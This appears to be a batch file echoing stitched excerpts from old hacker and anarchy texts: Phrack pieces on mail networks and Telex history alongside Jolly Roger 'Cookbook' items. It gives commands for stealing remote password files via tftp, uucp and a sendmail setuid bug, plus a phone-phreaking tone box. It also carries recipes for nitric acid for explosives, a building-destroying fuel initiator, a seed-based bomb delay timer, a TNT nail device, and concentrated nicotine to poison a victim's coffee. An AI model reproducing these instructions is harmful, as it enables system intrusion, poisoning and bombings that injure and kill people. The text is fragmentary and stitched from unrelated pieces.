echo ABA/net, ATT Mail, BIX (Byte Information eXchange), DASnet Network, Dialcom, EIES, EasyLink, Envoy 100, FAX, GeoMail, INET, MCI Mail, NWI, 
echo PeaceNet/EcoNet, Portal Communications, The Meta Network, The Source, Telemail, ATI's Telemail (Japan), Telex, TWICS (Japan), UNISON, 
echo UUCP, The WELL, and Domains (i.e. ".COM" and ".EDU" etc.). New systems are added all of the time. As of the writing of this file, Connect, 
echo GoverNET, MacNET, and The American Institute of Physics PI-MAIL are soon to be connected.
echo You can get various accounts on DASnet including:
echo · Corporate Accounts -- If your organization wants more than one individual subscription.
echo · Site Subscriptions -- If you want DASnet to link direc tly to your organization's electronic mail system.
echo To send e-mail through DASnet, you send the message to the DASnet account on your home system. You receive e-mail at your mailbox, as 
echo you do now. On the Wide-Area Networks, you send mail to XB.DAS@STANFORD.BITNET. On the Subject: line, you type the DASnet address in 
echo brackets and then the username just outside of them. The real subject can be expressed after the username separated by a " 
echo Subject: [0756TK]randyHow's Phrack?).
echo The only disadvantage of using DASnet as opposed to Wide-Area networks is the cost. Subscription costs as of 3/3/89 cost $4.75 per month 
echo or $5.75 per month for hosts that are outside of the USA
echo You are also charged for each message that you send. If you are corresponding with someone who is not a DASnet subscriber, THEIR MAIL 
echo TO YOU is billed to your account.
echo The following is an abbreviated cost list for mailing to the different services of DASnet:

echo Introduction:
echo After reading the earlier renditions of schematics for the Pearl Box, I decided that there was an easier and cheaper way of doing the same 
echo thing with an IC and parts you probably have just laying around the house.
echo What Is A Pearl Box and Why Do I Want One?
echo A Pearl Box is a tone generating device that is used to make a wide range of single tones. Therefore, it would be very easy to modify this 
echo basic design to make a Blue Box by making 2 Pearl Boxes and joining them together in some fashion.
echo A Pearl Box can be used to create any tone you wish that other boxes may not. It also has a tone sweep option that can be used for 
echo numerous things like detecting different types of phone tapping devices.
echo Parts List:
echo · CD4049 RCA integrated circuit
echo · .1 uF disk capacitor
echo · 1 uF 16V electrolitic capacitor
echo · 1K resistor
echo · 10M resistor
echo · 1Meg pot
echo · 1N914 diode
echo · Some SPST momentary push-button switches
echo · 1 SPDT toggle switch
echo · 9 Volt battery and clip and miscellaneous stuff you should have laying around the house.

echo 126. Phrack Magazine - Vol. 3, Issue 28 by Dark OverLord
echo  
echo There are many ways of getting copies of files from a remote system that you do not have permission to read or an account on login on to and 
echo access them through. Many administrators do not even bother to restrict many access points that you can use.
echo Here are the simplest ways:
echo 1.Use uucp'1' --Trivial File Transfer Protocol-- to retrieve a copy of a file if you are running on an Internet based network.
echo 2.Abuse uucp'1' --Unix to Unix Copy Program-- to retrieve a copy of a file if uucp connections are running on that system.
echo 3.Access one of many known security loopholes.
echo In the following examples, we will use the passwd file as the file to acquire since it is a readable file that can be found on most systems that 
echo these attacks are valid on.
echo Method A :
echo 1.First start the tftp program:
echo Enter the command:
echo tftp
echo --You have the following prompt:--
echo tftp>
echo 2.The next step is to connect to the system that you wish to retrieve files from. At the tftp, type:
echo tftp> connect other.system.com
echo 3.Now request the file you wish to get a copy of 'in our case, the passwd file /etc/passwd ':
echo tftp> get /etc/passwd /tmp/passwd
echo --You should see something that looks like the following:--
echo Received 185659 bytes in 22 seconds.
echo 4.Now exit the tftp program with the "quit" command:
echo tftp> quit
echo You should now have a copy of other.system.com's passwd file in your directory.
echo NOTE: Some Unix systems' tftp programs have a different syntax. The above was tested under SunOS 4.0
echo For example, on Apollos, the syntax is:
echo tftp -{g|g|p|r|w} <local file> <host> <foreign file> --netascii|image--
echo Thus you must use the command:
echo tftp -g password_file networked-host /etc/passwd
echo Consult your local "man" pages for more info 'or in other words RTFM'.
echo At the end of this article, I will include a shell script that will snarf a password file from a remote host. To use it type:
echo gpw system_name
echo Method B :
echo Assuming we are getting the file /etc/passwd from the system uusucker, and our system has a direct uucp connection to that system, it is 
echo possible to request a copy of the file through the uucp links. The following command will request that a copy of the passwd file be copied into 
echo uucp's home directory /usr/spool/uucppublic :
echo uucp -m uusucker/etc/passwd '>uucp/uusucker_passwd'
echo The flag "-m" means you will be notified by mail when the transfer is completed.
echo Method C:
echo  The third possible way to access the desired file requires that you have the login permission to the system.
echo In this case we will utilize a well-known bug in Unix's sendmail daemon.
echo The sendmail program has and option "-C" in which you can specify the configuration file to use 'by default this file is /usr/lib/sendmail.cf or 
echo /etc/sendmail.cf'. It should also be noted that the diagnostics outputted by sendmail contain the offending lines of text. Also note that the 
echo sendmail program runs setuid root.
echo The way you can abuse this set of facts 'if you have not yet guessed' is by specifying the file you wish read as the configuration file. Thus 
echo the command:
echo sendmail -C/usr/accounts/random_joe/private/file
echo Will give you a copy of random joe's private file.
echo Another similar trick is to symlink your .mailcf file to joe's file and mail someone. When mail executes sendmail 'to send the mail', it will load in 
echo your mailcf and barf out joe's stuff.
echo First, link joe's file to your .mailcf .
echo ln -s /usr/accounts/random_joe/private/file $HOME/.mailcf
echo Next, send mail to someone.
echo mail C488869@umcvmb.missouri.edu

echo 127.Phrack Magazine - Vol. 3, Issue 30 by Phone Phanatic
echo  "Until a few years ago -- maybe ten -- it was very common to
echo  see TWX and Telex machines in almost every business place."
echo There were only minor differences between Telex and TWX. The biggest difference was that the former was always run by Western Union, 
echo while the latter was run by the Bell System for a number of years. TWX literally meant "(T)ype(W)riter e(x)change," and it was Bell's answer 
echo to competition from Western Union. There were "three row" and "four row" machines, meaning the number of keys on the keyboard and how 
echo they were laid out. The "three row" machines were simply part of the regular phone network; that is, they could dial out and talk to another 
echo TWX also connected on regular phone lines.
echo Eventually these were phased out in favor of "newer and more improved" machines with additional keys, as well as a paper tape reader 
echo attachment which allowed sending the same message repeatedly to many different machines. These "four row" machines were not on the 
echo regular phone network, but were assigned their own area codes (410-510-610-710-810-910) where they still remain today. The only way a 
echo four row machine could call a three row machine or vice-versa was through a gateway of sorts which translated some of the character set 
echo unique to each machine.
echo Western Union's network was called Telex and in addition to being able to contact (by dial up) other similar machines, Telex could connect with 
echo TWX (and vice-versa) as well as all the Western Union public offices around the country. Until the late 1950's or early 1960's, every small 
echo town in America had a Western Union office. Big cities like Chicago had perhaps a dozen of them, and they used messengers to hand deliver 
echo telegrams around town. Telegrams could be placed in person at any public office, or could be called in to the nearest public office.
echo By arrangement with most telcos, the Western Union office in town nearly always had the phone number 4321, later supplemented in 
echo automated exchanges with some prefix XXX-4321. Telegrams could be charged to your home phone bill (this is still the case in some 
echo communities) and from a coin phone, one did not ask for 4321, but rather, called the operator and asked for Western Union. This was 
echo necessary since once the telegram had been given verbally to the wire clerk, s/he in turn had to flash the hook and get your operator back on 
echo the line to tell them "collect five dollars and twenty cents" or whatever the cost was. Telegrams, like phone calls, could be sent collect or billed 
echo third party. If you had an account with Western Union, i.e. a Telex machine in your office, you could charge the calls there, but most likely you 
echo would simply send the telegram from there in the first place.
echo Sometime in the early 1960's, Western Union filed suit against ATandT asking that they turn over their TWX business to them. They cited an earlier 
echo court ruling, circa 1950's, which said ATandT was prohibited from acquiring any more telephone operating companies except under certain 
echo conditions. The Supreme Court agreed with Western Union that "spoken messages" were the domain of Ma Bell, but "written messages" were 
echo the domain of Western Union. So Bell was required to divest itself of the TWX network, and Western Union has operated it since, although a 
echo few years ago they began phasing out the phrase "TWX" in favor of "Telex II"; their original device being "Telex I" of course. TWX still uses ten 
echo digit dialing with 610 (Canada) or 710/910 (USA) being the leading three digits. Apparently 410-510 have been abandoned; or at least they are 
echo used very little, and Bellcore has assigned 510 to the San Francisco area starting in a year or so. 410 still has some funny things on it, like the 
echo Western Union "Infomaster," which is a computer that functions like a gateway between Telex, TWX, EasyLink and some other stuff.
echo Today, the Western Union network is but a skeleton of its former self. Now most of their messages are handled on dial up terminals connected 
echo to the public phone network. It has been estimated the TWX/Telex business is about fifty percent of what it was a decade ago, if that much.
echo Then there was the Time Service, a neat thing which Western Union offered for over seventy years, until it was discontinued in the middle 
echo 1960's. The Time Service provided an important function in the days before alternating current was commonly available. For example, Chicago 
echo didn't have AC electricity until about 1945. Prior to that we used DC, or direct current.
echo Well, to run an electric clock, you need 60 cycles AC current for obvious reasons, so prior to the conversion from DC power to AC power, 
echo electric wall clocks such as you see in every office were unheard of. How were people to tell the time of day accurately? Enter the Western 
echo Union clock.
echo The Western Union, or "telegraph clock" was a spring driven wind up clock, but with a difference. The clocks were "perpetually self-winding," 
echo manufactured by the Self-Winding Clock Company of New York City. They had large batteries inside them, known as "telephone cells" which 
echo had a life of about ten years each. A mechanical contrivance in the clock would rotate as the clock spring unwound, and once each hour 
echo would cause two metal clips to contact for about ten seconds, which would pass juice to the little motor in the clock which in turn re-wound 
echo the main spring. The principle was the same as the battery operated clocks we see today. The battery does not actually run the clock -- direct 
echo current can't do that -- but it does power the tiny motor which re-winds the spring which actually drives the clock.
echo The Western Union clocks came in various sizes and shapes, ranging from the smallest dials which were nine inches in diameter to the largest 
echo which were about eighteen inches in diameter. Some had sweep second hands; others did not. Some had a little red light bulb on the front 
echo which would flash. The typical model was about sixteen inches, and was found in offices, schools, transportation depots, radio station 
echo offices, and of course in the telegraph office itself.
echo The one thing all the clocks had in common was their brown metal case and cream-colored face, with the insignia "Western Union" and their 
echo corporate logo in those days which was a bolt of electricity, sort of like a letter "Z" laying on its side. And in somewhat smaller print below, the 
echo words "Naval Observatory Time."
echo The local clocks in an office or school or wherever were calibrated by a "master clock" (actually a sub-master) on the premises. Once an hour 
echo on the hour, the (sub) master clock would drop a metal contact for just a half second, and send about nine volts DC up the line to all the local 
echo clocks. They in turn had a "tolerance" of about two minutes on both sides of the hour so that the current coming to them would yank the minute 
echo hand exactly upright onto the twelve from either direction if the clock was fast or slow.
echo The sub-master clocks in each building were in turn serviced by the master clock in town; usually this was the one in the telegraph office. 
echo Every hour on the half hour, the master clock in the telegraph office would throw current to the sub-masters, yanking them into synch as 
echo required. And as for the telegraph offices themselves, they were serviced twice a day by -- you guessed it -- the Naval Observatory Master 
echo clock in Our Nation's Capitol, by the same routine.
echo Someone there would press half a dozen buttons at the same time, using all available fingers; current would flow to every telegraph office and 
echo synch all the master clocks in every community. Western Union charged fifty cents per month for the service, and tossed the clock in for free 
echo Oh yes, there was an installation charge of about two dollars when you first had service (i.e. a clock) installed.
echo The clocks were installed and maintained by the "clockman," a technician from Western Union who spent his day going around hanging new 
echo clocks, taking them out of service, changing batteries every few years for each clock, etc.
echo What a panic it was for them when "war time" (what we now call Daylight Savings Time) came around each year Wally, the guy who 
echo serviced all the clocks in downtown Chicago had to start on *Thursday* before the Sunday official changeover just to finish them all by 
echo *Tuesday* following. He would literally rush in an office, use his screwdriver to open the case, twirl the hour hand around one hour forward in 
echo the spring, (or eleven hours *forward* in the fall since the hands could not be moved backward beyond the twelve going counterclockwise), 
echo slam the case back on, screw it in, and move down the hall to the next clock and repeat the process. He could finish several dozen clocks per 
echo day, and usually the office assigned him a helper twice a year for these events.
echo He said they never bothered to line the minute hand up just right, because it would have taken too long, and ".....anyway, as long as we got it 
echo within a minute or so, it would synch itself the next time the master clock sent a signal..." Working fast, it took a minute to a minute and a half to 
echo open the case, twirl the minute hand, put the case back on, "stop and BS with the receptionist for a couple seconds" and move along.
echo The master clock sent its signal over regular telco phone lines. Usually it would terminate in the main office of whatever place it was, and the 
echo (sub) master there would take over at that point.
echo Wally said it was very important to do a professional job of hanging the clock to begin with. It had to be level, and the pendulum had to be just 
echo right, otherwise the clock would gain or lose more time than could be accommodated in the hourly synching process. He said it was a very 
echo rare clock that actually was out by even a minute once an hour, let alone the two minutes of tolerance built into the gear works.
echo "...Sometimes I would come to work on Monday morning, and find out in the office that the clock line had gone open Friday evening. So nobody 
echo all weekend got a signal. Usually I would go down a manhole and find it open someplace where one of the Bell guys messed it up, or took it off 
echo and never put it back on. To find out where it was open, someone in the office would 'ring out' the line; I'd go around downtown following the 
echo loop as we had it laid out, and keep listening on my headset for it. When I found the break or the open, I would tie it down again and the office 
echo would release the line; but then I had to go to all the clocks *before* that point and restart them, since the constant current from the office 
echo during the search had usually caused them to stop."
echo But he said, time and again, the clocks were usually so well mounted and hung that "...it was rare we would find one so far out of synch that 
echo we had to adjust it manually. Usually the first signal to make it through once I repaired the circuit would yank everyone in town to make up for 
echo whatever they lost or gained over the weekend..."
echo In 1965, Western Union decided to discontinue the Time Service. In a nostalgic letter to subscribers, they announced their decision to suspend 
echo operations at the end of the current month, but said "for old time's sake" anyone who had a clock was welcome to keep it and continue using it; 
echo there just would not be any setting signals from the master clocks any longer.
echo Within a day or two of the official announcement, every Western Union clock in the Chicago area headquarters building was gone. The 
echo executives snatched them off the wall, and took them home for the day when they would have historical value. All the clocks in the telegraph 
echo offices disappeared about the same time, to be replaced with standard office-style electric wall clocks.

echo 128.Phrack Magazine - Vol. 3, Issue 30 by Synthecide
echo There are literally hundreds of systems connected to some of these larger networks, like Tymnet and Telenet. Navigation around these 
echo networks is very simple, and usually well explained in their on-line documentation. Furthermore, some systems will actually tell you what is 
echo connected and how to get to it. In the case of Tymnet, after dialing in, at the log in prompt, type "information" for the on-line documentation.
echo Accessing systems through networks is as simple as providing an address for it to connect to. The best way to learn about the addresses 
echo and how to do things on a network is to read "A Novice's Guide to Hacking (1989 Edition)" which was in Issue 22, File 4 of 12, Volume Two 
echo (December 23, 1988). Some points are reiterated here.
echo Once on a network, you provide the NUA (network user address) of the system you wish to connect to. NUAs are strings of 15 digits, broken 
echo up in to 3 fields, the NETWORK ADDRESS, the AREA PREFIX, and the DNIC. Each field has 5 digits, and are left padded with 0's where 
echo necessary.
echo The DNIC determines which network to take the address from. Tymnet, for example, is 03106. 03110 is Telenet.
echo The AREA PREFIX and NETWORK ADDRESS determine the connection point. By providing the address of the system that you wish to connect 
echo to, you will be accessing it through the net... as if you were calling it directly. Obviously, then, this provides one more level of security for 
echo access. By connecting to an outdial, you can increase again the level of security you enjoy, by using the outdial in that area to connect to the 
echo remote system.
echo Addendum -- Accessing Tymnet Over Local Packet Networks
echo This is just another way to get that extra step and/or bypass other routes. This table is copied from Tymnet's on-line information. As said 
echo earlier, it's a great resource, this on-line information

echo 129.Phrack Magazine - Vol. 3, Issue 30 by Dedicated Link
echo INTRODUCTION
echo DECWRL is a mail gateway computer operated by Digital's Western Research Laboratory in Palo Alto, California. Its purpose is to support the 
echo interchange of electronic mail between Digital and the "outside world."
echo DECWRL is connected to Digital's Easynet, and also to a number of different outside electronic mail networks. Digital users can send outside 
echo mail by sending to DECWRL::"outside-address", and digital users can also receive mail by having your correspondents route it through 
echo DECWRL. The details of incoming mail are more complex, and are discussed below.
echo It is vitally important that Digital employees be good citizens of the networks to which we are connected. They depend on the integrity of our 
echo user community to ensure that tighter controls over the use of the gateway are not required. The most important rule is "no chain letters," but 
echo there are other rules depending on whether the connected network that you are using is commercial or non-commercial.
echo The current traffic volume (September 1989) is about 10,000 mail messages per day and about 3,000 USENET messages per day. Gatewayed 
echo mail traffic has doubled every year since 1983. DECWRL is currently a Vax 8530 computer with 48 megabytes of main memory, 2500 
echo megabytes of disk space, 8 9600-baud (Telebit) modem ports, and various network connections. They will shortly be upgrading to a Vax 8650 
echo system. They run Ultrix 3.0 as the base operating system.
echo ADMINISTRATION
echo The gateway has engineering staff, but no administrative or clerical staff. They work hard to keep it running, but they do not have the 
echo resources to answer telephone queries or provide tutorials in its use.
echo They post periodic status reports to the USENET newsgroup dec.general. Various helpful people usually copy these reports to the VAXNOTES 
echo "gateways" conference within a day or two.
echo HOW TO SEND MAIL
echo DECWRL is connected to quite a number of different mail networks. If you were
echo logged on directly to it, you could type addresses directly, e.g.
echo  To: strangeaddress.
echo But since you are not logged on directly to the gateway, you must send mail so that when it arrives at the gateway, it will be sent as if that 
echo address had been typed locally.
echo * Sending from VMS
echo If you are a VMS user, you should use NMAIL, because VMS mail does not know how to requeue and retry mail when the network is 
echo congested or disconnected. From VMS, address your mail like this:
echo  To: nm%DECWRL::"strangeaddress"
echo The quote characters (") are important, to make sure that VMS doesn't try to interpret strangeaddress itself. If you are typing such an 
echo address inside a mail program, it will work as advertised. If you are using DCL and typing directly to the command line, you should beware that 
echo DCL likes to remove quotes, so you will have to enclose the entire address in quotes, and then put two quotes in every place that one quote 
echo should appear in the address:
echo  $ mail test.msg "nm%DECWRL::""foreignaddr""" /subj="hello"
echo Note the three quotes in a row after foreignaddr. The first two of them are doubled to produce a single quote in the address, and the third 
echo ends the address itself (balancing the quote in front of the nm%).
echo Here are some typical outgoing mail addresses as used from a VMS system:
echo  To: nm%DECWRL::"lll-winkinphrack"
echo  To: nm%DECWRL::"postmaster@msp.pnet.sc.edu"
echo  To: nm%DECWRL::"netsysphrack@uunet.uu.net"
echo  To: nm%DECWRL::"phrackserv@CUNYVM.bitnet"
echo  To: nm%DECWRL::"Chris.Jones@f654.n987.z1.fidonet.org"
echo * Sending from Ultrix
echo If your Ultrix system has been configured for it, then you can, from your Ultrix system, just send directly to the foreign address, and the mail 
echo software will take care of all of the gateway routing for you. Most Ultrix systems in Corporate Research and in the Palo Alto cluster are 
echo configured this way. 
echo To find out whether your Ultrix system has been so configured, just try it and see what happens. If it doesn't work, you will receive notification 
echo almost instantly.
echo NOTE: The Ultrix mail system is extremely flexible; it is almost completely configurable by the customer. While this is valuable to customers, it 
echo makes it very difficult to write global instructions for the use of Ultrix mailers, because it is possible that the local changes have produced 
echo something quite unlike the vendor-delivered mailer. One of the popular changes is to tinker with the meaning of quote characters (") in Ultrix 
echo addresses. Some systems consider that these two addresses are the same:
echo  site1user@host.dec.com
echo  and
echo  "site1user"@host.dec.com
echo while others are configured so that one form will work and the other will not. All of these examples use the quotes. If you have trouble getting 
echo the examples to work, please try them again without the quotes. Perhaps your Ultrix system is interpreting the quotes differently.
echo If your Ultrix system has an IP link to Palo Alto (type "/etc/ping decwrl.dec.com" to find out if it does), then you can route your mail to the 
echo gateway via IP. This has the advantage that your Ultrix mail headers will reach the gateway directly, instead of being translated into DECNET 
echo mail headers and then back into Ultrix at the other end. Do this as follows:
echo  To: "alienaddress"@decwrl.dec.com
echo The quotes are necessary only if the alien address contains a  character, but they don't hurt if you use them unnecessarily. If the alien 
echo address contains an "@" character, you will need to change it into a "%" character. For example, to send via IP to joe@widget.org, you should 
echo address the mail.
echo  To: "joe%widget.org"@decwrl.dec.com
echo If your Ultrix system has only a DECNET link to Palo Alto, then you should address mail in much the same way that VMS users do, save that you 
echo should not put the nm% in front of the address:
echo  To: DECWRL::"strangeaddress"
echo Here are some typical outgoing mail addresses as used from an Ultrix system that has IP access. Ultrix systems without IP access should use 
echo the same syntax as VMS users, except that the nm% at the front of the address should not be used.
echo  To: "lll-winkenphrack"@decwrl.dec.com
echo  To: "postmaster%msp.pnet.sc.edu"@decwrl.dec.com
echo  To: "phrackserv%CUNYVM.bitnet"@decwrl.dec.com
echo  To: "netsysphrack%uunet.uu.net"@decwrl.dec.com
echo  To: "Chris.Jones@f654.n987.z1.fidonet.org"@decwrl.dec.com
echo DETAILS OF USING OTHER NETWORKS
echo All of the world's computer networks are connected together, more or less, so it is hard to draw exact boundaries between them. Precisely 
echo where the internet ends and UUCP begins is a matter of interpretation.
echo For purposes of sending mail, though, it is convenient to divide the network universe into these categories:
echo Easynet:
echo Digital's internal DECNET network. Characterized by addresses of the form NODE::USER. Easynet can be used for commercial 
echo purposes.
echo Internet:
echo A collection of networks including the old ARPAnet, the NSFnet, the CSnet, and others. Most international research, development, 
echo and educational organizations are connected in some fashion to the Internet. Characterized by addresses of the form
echo user@site.subdomain.domain. The internet itself cannot be used for commercial purposes.
echo UUCP:
echo A very primitive netw ork with no management, built with auto-dialers phoning one computer from another. Characterized by 
echo addresses of the form place1user. The UUCP network can be used for commercial purposes provided that none of the sites 
echo through which the message is routed objects to that.
echo USENET:
echo Not a network at all, but a layer of software built on top of UUCP and Internet.
echo BITNET:
echo An IBM-based network linking primarily educational sites. Digital users can send to BITNET as if it were part of internet, but BITNET
echo users need special instructions for reversing the process. BITNET cannot be used for commercial purposes.
echo Fidonet:
echo A network of personal computers. I am unsure of the status of using Fidonet for commercial purposes, nor am I sure of its efficacy.
echo DOMAINS AND DOMAIN ADDRESSING
echo There is a particular network called "the Internet;" it is somewhat related to what used to be "the ARPAnet." The Internet style of addressing is 
echo flexible enough that people use it for addressing other networks as well, with the result that it is quite difficult to look at an address and tell just 
echo what network it is likely to traverse. But the phrase "Internet address" does not mean "mail address of some computer on the Internet" but 
echo rather "mail address in the style used by the Internet." Terminology is even further confused because the word "address" means one thing to 
echo people who build networks and something entirely different to people who use them. In this file an "address" is something like
echo "mike@decwrl.dec.com" and not "192.1.24.177" (which is what network engineers would call an "internet address").
echo The Internet naming scheme uses hierarchical domains, which despite their title are just a bookkeeping trick. It doesn't really matter whether 
echo you say NODE: :USER or USER@NODE, but what happens when you connect two companies' networks together and they both have a node 
echo ANCHOR?? You must, somehow, specify which ANCHOR you mean. You could say ANCHOR.DEC::USER or DEC.ANCHOR::USER or 
echo USER@ANCHOR.DEC or USER@DEC.ANCHOR. The Internet convention is to say USER@ANCHOR.DEC, with the owner (DEC) after the name 
echo (ANCHOR).
echo But there could be several different organizations named DEC. You could have Digital Equipment Corporation or Down East College or Disabled 
echo Education Committee. The technique that the Internet scheme uses to resolve conflicts like this is to have hierarchical domains. A normal domain 
echo isn't DEC or STANFORD, but DEC.COM (commercial) and STANFORD.EDU (educational). These domains can be further divided into
echo ZK3.DEC.COM or CS.STANFORD.EDU. This doesn't resolve conflicts completely, though: both Central Michigan University and Carnegie-Mellon 
echo University could claim to be CMU.EDU. The rule is that the owner of the EDU domain gets to decide, just as the owner of the CMU.EDU gets to 
echo decide whether the Electrical Engineering department or the Elementary Education department gets subdomain EE.CMU.EDU.
echo The domain scheme, while not perfect, is completely extensible. If you have two addresses that can potentially conflict, you can suffix some 
echo domain to the end of them, thereby making, say, decwrl.UUCP be somehow different from DECWRL.ENET.
echo DECWRL's entire mail system is organized according to Internet domains, and in fact we handle all mail internally as if it were Internet mail. 
echo Incoming mail is converted into Internet mail, and then routed to the appropriate domain; if that domain requires some conversion, then the mail is 
echo converted to the requirements of the outbound domain as it passes through the gateway. For example, they put Easynet mail into the domain 
echo ENE.
echo On a side note, the recent book The Cuckoo's Egg provides some interesting information (in the form of a story, however) on a Tymnet hacker. 
echo Remember that he was into BIG things, and hence he was cracked down upon. If you keep a low profile, networks should provide a good 
echo access method.
echo If you can find a system that is connected to the Internet that you can get on from Tymnet, you are doing well.
echo Username@f<node #>.n<net #>.z<zone #>.ifna.org
echo In other words, if I wanted to mail to Silicon Swindler at 1:135/5, the address would be Silicon_Swindler@f5.n135.z1.ifna.org and, provided 
echo that your mailer knows the .ifna.org domain, it should get through alright. Apparently, as of the writing of this article, they have implemented a 
echo new gateway name called fidonet.org which should work in place of ifna.org in all routings. If your mailer does not know either of these 
echo domains, use the above routing but replace the first "@" with a "%" and then afterwards, use either of the following mailers after the "@": 
echo CS.ORST.EDU or K9.CS.ORST.EDU (i.e. username%f<node #>.n<net #>.z<zone #>.fidonet.org@CS.ORST.EDU --or replace CS.ORST.EDU with 
echo K9.CS.ORST.EDU--).
echo The following is a list compiled by Bill Fenner (WCF@PSUECL.BITNET) that was posted on INFONETS DIGEST which lists a number of FIDONET 
echo gateways:
echo Net Node Node Name
echo 104 56 milehi.ifna.org
echo 105 55 casper.ifna.org
echo 107 320 rubbs.ifna.org
echo 109 661 blkcat.ifna.org
echo 125 406 fidogate.ifna.org
echo 128 19 hipshk.ifna.org
echo 129 65 insight.ifna.org
echo 143 N/A fidogate.ifna.org
echo 152 200 castle.ifna.org
echo 161 N/A fidogate.ifna.org
echo 369 17 megasys.ifna.org
echo NOTE: The UUCP equivalent node name is the first part of the node name. In other words, the UUCP node milehi is listed as milehi.ifna.org 
echo but can be mailed directly over the UUCP network.
echo Another way to mail to FIDONET, specifically for Internet people, is in this format:
echo ihnp4ncoast<net #>user_name@husc6.harvard.edu
echo And for those UUCP mailing people out there, just use the path described and ignore the @husc5.harvard.edu portion. There is a FIDONET 
echo NODELIST available on most any FIDONET bulletin board, but it is quite large.
echo ONTYME
echo Previously known as Tymnet, OnTyme is the McDonnell Douglas revision. After they bought out Tymnet, they renamed the company and 
echo opened an experimental Internet gateway at ONTYME.TYMNET.COM but this is supposedly only good for certain corporate addresses within 
echo McDonnell Douglas and Tymnet, not their customers. The userid format is xx.yyy or xx.y/yy where xx is a net name and yyy (or y/yy) is a true 
echo username. If you cannot directly nail this, try:
echo xx.yyy%ONTYME.TYM

echo 133.Nitric Acid by The Jolly Roger
echo Nitric Acid is used in the preparation of many explosives, incendiary mixtures, and acid delay timers. It may be prepared by distilling a mixture of 
echo potassium nitrate and concentrated sulfuric acid.
echo Material Required:
echo · Potassium Nitrate (2 parts by volume)
echo · CONCENTRATED sulfuric acid (1 part by volume)
echo · 2 bottles or ceramin jugs (narrow necks are preferable)
echo · Pot or frying pan
echo · Heat source (wood, charcoal, or coal)
echo · Tape (paper, electrical, masking, but NOT cellophane)
echo · Paper or rags
echo IMPORTANT: If sulfuric acid is obtained from a motor vehicle battery, concentrate it by boiling it UNTIL white fumes appear. DO NOT INHALE 
echo FUMES.
echo NOTE: The amount of nitric acid produced is the same as the amount of potassium nitrate. Thus, for two tablespoons of nitric acid, use 2 
echo tablespoons of potassium nitrate and 1 tablespoonful of concentrated sulfuric acid.
echo Source of Potassium Nitrate:
echo · Elsewhere in this Cookbook 
echo · Drug stores
echo Source of CONCENTRATED sulfuric acid:
echo · Motor vehicle batteries

echo Procedure:
echo 1.Place dry potassium nitrate in bottle or jug. Add sulfuric acid. Do not fill the bottle more than ¬ full. Mix until paste is formed.
echo · CAUTION: DO NOT INHALE FUMES
echo 2.Wrap paper or rags around necks of two bottles. securely tape necks of two bottles together. Be sure that bottles are flush against each 
echo other and that there are no air spaces.
echo 3.Support bottles on rocks or cans so that empty bottle is SLIGHTLY lower than bottle containing paste so that nitric acid that is formed in 
echo receiving bottle will not run into other bottle.
echo 4.Build fire in pot or frying pan.
echo 5.Gently heat bottle containing mixture by gently moving fire in and out. As red fumes begin to appear periodically pour cool water over empty 
echo receiving bottle. Nitric acid will begin to form in receiving bottle.
echo · CAUTION: Do not overheat or wet bottle containing mixture or it may shatter. As an added precaution, place bottle to be heated 
echo in heat resistant container filled with sand or gravel. Heat this outer container to produce nitric acid.
echo 6.Continue the above process until no more red fumes are formed. If the nitric acid formed in the receiving bottle is not clear (cloudy) pour it into 
echo cleaned bottle and repeat steps 2-6.
echo · CAUTION: Nitric acid should be kept away from all combustibles and should be kept in a SEALED CERAMIC OR GLASS 
echo container. DO NOT inhale fumes

echo NOTE: If it is desired to carry the initiator some distance, cardboard may
echo be pressed on top of the aluminum to insure against loss of material.
echo How to Use:
echo This particular unit works quite well to initiate charges of five pounds of flour, « gallon (1-2/3 liters) of gasoline, or two pounds of flake painters 
echo aluminum. The solid materials may merely be contained in sacks or cardboard cartons. The gasoline may be placed in plastic coated paper milk 
echo cartons, as well as plastic or glass bottles. The charges are placed directly on top of the initiator and the blasting cap is actuated electrically or 
echo by a fuse depending on the type of cap employed. this will destroy a 2,000 cubic feet enclosure (building 10 x 20 x 10 feet).
echo Note: For larger enclosures, use proportionally larger initiators and charges.

echo Nicotine is an abundant poison. Easily found in tobacco products, in concentrated form a few drops can quickly kill someone. Here is how to 
echo concentrate it:
echo First get a can of chewing tobacco or pipe tobacco. Remove the contents and soak in water overnight in a jar (about 2/3 cup of water will 
echo do...). In the morning, strain into another jar the mixture through a porous towel. Then wrap the towel around the ball of tobacco and squeeze it 
echo until all of the liquid is in the jar. Throw away the tobacco--you will not need it anymore.
echo  Now you have two options. I recommend the first. It makes the nicotine more potent.
echo 1.Allow to evaporate until a sticky syrup results in the jar. This is almost pure nicotine (hell, it is pure enough for sure).
echo 2.Heat over low flame until water is evaporated and a thick sticky syrup results (I don't know how long it takes... shouldn't take too 
echo long, though.).
echo Now all you have to do, when you wish to use it, is to put a few drops in a medicine dropper or equivalent, and slip about 4 or 5 drops into the 
echo victim's coffee. Coffee is recommended since it will disguise the taste. Since nicotine is a drug, the vic tim should get quite a buzz before they 
echo turn their toes up to the daisies, so to speak.
echo Note: If the syrup is too sticky, dilute it with a few drops of water. And while you are at it, better add an extra drop to the coffee just to be

echo · Dried peas, beans, or other dehydrated seeds
echo · Wide-mouth glass jar with non-metal cap
echo · Two screws or bolts
echo · Thin metal plate
echo · Hand drill
echo · Screwdriver
echo Procedure:
echo 1.Determine the rate of the rise of the dried seeds selected. This is necessary to determine the delay time of the timer.
echo · Place a sample of the dried seeds in the jar and cover with water.
echo · Measure the time it takes for the seeds to rise a given height. Most dried seeds increase 50% in one to two hours.
echo 2.Cut a disc from thin metal plate. Disc should fit loosely inside the jar.
echo NOTE: If metal is painted, rusty, or otherwise coated, it must be scraped or sanded to obtain a clean metal surface
echo 3.Drill two holes in the cap of the jar about 2 inches apart. Diameter of holes should be such that screws or bolts will thread tightly into them. If 
echo the jar has a metal cap or no cap, a piece of wood or plastic (NOT METAL) can be used as a cover.
echo 4.Turn the two screws or bolts through the holes in the cap. Bolts should extend about one in. (2 « cm) into the jar.
echo IMPORTANT: Both bolts must extend the same distance below the container cover.
echo 5.Pour dried seeds into the container. The level will depend upon the previously measured rise time and the desired delay.
echo 6.Place the metal disc in the jar on top of the seeds.
echo How to use:
echo 1.Add just enough water to completely cover the seeds and place the cap on the jar.
echo 2.Attach connecting wires from the firing circuit to the two screws on the cap.
echo Expansion of the seeds will raise the metal disc until it contacts the screws and closes the circuit.

echo Material Required:
echo · Block of TNT or other blasting explosive
echo · Nails
echo · Non-electric (military or improvised) blasting cap
echo · Fuse Cord
echo · Tape, string, wire, or glue
echo Procedure:
echo 1.If an explosive charge other than a standard TNT block is used, make a hole in the center of the charge for inserting the blasting cap. TNT 
